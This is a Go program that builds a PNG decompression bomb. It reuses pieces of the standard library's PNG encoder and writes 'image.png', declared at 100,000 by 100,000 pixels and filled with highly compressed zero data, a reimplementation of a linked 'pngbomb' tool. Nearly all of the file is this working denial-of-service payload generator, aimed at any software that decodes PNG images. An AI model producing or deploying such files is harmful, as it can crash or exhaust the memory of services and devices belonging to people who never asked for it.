// main
package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"image"
	"image/color"
	"image/png"
	"io"
	"os"
	"strconv"
)

/*
from image/png/reader.go
*/

const pngHeader = "\x89PNG\r\n\x1a\n"

// Color type, as per the PNG spec.
const (
	ctGrayscale      = 0
	ctTrueColor      = 2
	ctPaletted       = 3
	ctGrayscaleAlpha = 4
	ctTrueColorAlpha = 6
)

// Filter type, as per the PNG spec.
const (
	ftNone    = 0
	ftSub     = 1
	ftUp      = 2
	ftAverage = 3
	ftPaeth   = 4
	nFilter   = 5
)

// An UnsupportedError reports that the input uses a valid but unimplemented PNG feature.
type UnsupportedError string

func (e UnsupportedError) Error() string { return "png: unsupported feature: " + string(e) }

// A FormatError reports that the input is not a valid PNG.
type FormatError string

func (e FormatError) Error() string { return "png: invalid format: " + string(e) }

/*
from image/png/writer.go
*/

type encoder struct {
	enc     *png.Encoder
	w       io.Writer
	m       image.Image
	cb      int
	err     error
	header  [8]byte
	footer  [4]byte
	tmp     [4 * 256]byte
	cr      [nFilter][]uint8
	pr      []uint8
	zw      *zlib.Writer
	zwLevel int
	bw      *bufio.Writer
}

func (e *encoder) writeChunk(b []byte, name string) {
	if e.err != nil {
		return
	}
	n := uint32(len(b))
	if int(n) != len(b) {
		e.err = UnsupportedError(name + " chunk is too large: " + strconv.Itoa(len(b)))
		return
	}
	binary.BigEndian.PutUint32(e.header[:4], n)
	e.header[4] = name[0]
	e.header[5] = name[1]
	e.header[6] = name[2]
	e.header[7] = name[3]
	crc := crc32.NewIEEE()
	crc.Write(e.header[4:8])
	crc.Write(b)
	binary.BigEndian.PutUint32(e.footer[:4], crc.Sum32())

	_, e.err = e.w.Write(e.header[:8])
	if e.err != nil {
		return
	}
	_, e.err = e.w.Write(b)
	if e.err != nil {
		return
	}
	_, e.err = e.w.Write(e.footer[:4])
}

func (e *encoder) writeIHDR() {
	b := e.m.Bounds()
	binary.BigEndian.PutUint32(e.tmp[0:4], uint32(b.Dx()))
	binary.BigEndian.PutUint32(e.tmp[4:8], uint32(b.Dy()))
	e.tmp[8] = 1
	e.tmp[9] = ctGrayscale
	e.tmp[10] = 0 // default compression method
	e.tmp[11] = 0 // default filter method
	e.tmp[12] = 0 // non-interlaced
	e.writeChunk(e.tmp[:13], "IHDR")
}

// This function is required because we want the zero value of
// Encoder.CompressionLevel to map to zlib.DefaultCompression.
func levelToZlib(l png.CompressionLevel) int {
	switch l {
	case png.DefaultCompression:
		return zlib.DefaultCompression
	case png.NoCompression:
		return zlib.NoCompression
	case png.BestSpeed:
		return zlib.BestSpeed
	case png.BestCompression:
		return zlib.BestCompression
	default:
		return zlib.DefaultCompression
	}
}

func (e *encoder) writeIEND() { e.writeChunk(nil, "IEND") }

/*
from image/png/writer_test.go
*/
type pool struct {
	b *png.EncoderBuffer
}

func (p *pool) Get() *png.EncoderBuffer {
	return p.b
}

func (p *pool) Put(b *png.EncoderBuffer) {
	p.b = b
}

/*
Reimplementation of https://github.com/liclac/pngbomb/blob/f0fc2f2a42784557727e44be2f1b86844759a6fa/src/main.rs#L128-L151
*/
func writePayload(width int, height int, w io.WriteSeeker) (err error) {
	// PNG bitmap data is grouped in "scanlines", eg. data for one horizontal line, prefixed with
	// a 1-byte filter mode flag. We're using no filters (0) and all-black (0) pixels, we just want
	// to generate a whole pile of deflated zeroes, but without allocating it all upfront.
	samples := width
	samplesPerByte := 8 / 1
	whole := samples / samplesPerByte
	var fract int
	if samples%samplesPerByte > 0 {
		fract = 1
	}
	rawRowLength := 1 + whole + fract
	ibytes := rawRowLength * height

	// set up a zlib writer to compress image data
	var b bytes.Buffer
	zw, err := zlib.NewWriterLevel(&b, 9)
	if err != nil {
		return err
	}

	// write the blank image data through zlib
	var at int
	buf := make([]byte, 2*1024*1024)
	for {
		ln := ibytes - at
		if ln > len(buf) {
			ln = len(buf)
		}
		if ln <= 0 {
			break
		}
		n, err := zw.Write(buf[:ln])
		if err != nil {
			return err
		}
		at += n
	}

	// write header
	name := "IDAT"
	header := make([]byte, 8)
	n := uint32(b.Len())
	binary.BigEndian.PutUint32(header[:4], n)
	header[4] = name[0]
	header[5] = name[1]
	header[6] = name[2]
	header[7] = name[3]
	crc := crc32.NewIEEE()
	crc.Write(header[4:8])
	crc.Write(b.Bytes())

	_, err = w.Write(header[:8])
	if err != nil {
		return err
	}

	// write body
	_, err = w.Write(b.Bytes())
	if err != nil {
		return err
	}

	// write footer
	footer := make([]byte, 4)
	binary.BigEndian.PutUint32(footer[:4], crc.Sum32())
	_, err = w.Write(footer[:4])
	return err
}

func generatePNG(width int, height int, w io.WriteSeeker) error {
	e := &encoder{}
	pal := color.Palette{color.Gray{0}}
	e.m = image.NewPaletted(image.Rectangle{image.Point{0, 0}, image.Point{width, height}}, pal)
	e.cb = 1
	e.w = w
	e.enc = &png.Encoder{-3, &pool{}}

	io.WriteString(w, pngHeader)
	e.writeIHDR()
	err := writePayload(width, height, w)
	if err != nil {
		return fmt.Errorf("unable to write payload: %v", err)
	}
	e.writeIEND()

	return nil
}

var (
	debug = false
)

func main() {
	width := 100000
	height := 100000
	w, err := os.Create("image.png")
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(2)
	}
	err = generatePNG(width, height, w)
	if err != nil {
		fmt.Printf("error: %v\n", err)
		os.Exit(2)
	}
}
